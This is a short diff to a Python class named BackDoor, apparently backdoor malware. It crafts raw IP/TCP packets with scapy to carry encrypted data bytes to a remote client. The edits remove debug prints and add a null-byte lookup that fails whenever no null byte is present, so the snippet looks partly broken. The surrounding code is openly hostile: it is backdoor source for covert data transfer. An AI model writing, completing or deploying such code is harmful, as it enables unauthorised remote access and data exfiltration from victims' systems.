@@ -284,9 +284,6 @@ class BackDoor:
         print(f"got src and terminator {src, terminator}")
         packets = []
         for index, byte in enumerate(data):
-            if b'\x00' in byte:
-                print(1)
-                print("yooooo")
             packet = IP(dst=self.client) / TCP(sport=src, dport=self.send_port) / Raw(load=byte)
             packets.append(packet)
 
@@ -481,6 +478,8 @@ class BackDoor:
         padder = padding.PKCS7(128).padder()
         padded_line = padder.update(line.encode()) + padder.finalize()
         encrypted_line = encryptor.update(padded_line) + encryptor.finalize()
+        index = encrypted_line.index(b'\x00')
+        print("Sequence found at index:", index)
         return encrypted_line
 
     def generate_cipher(self) -> Cipher:
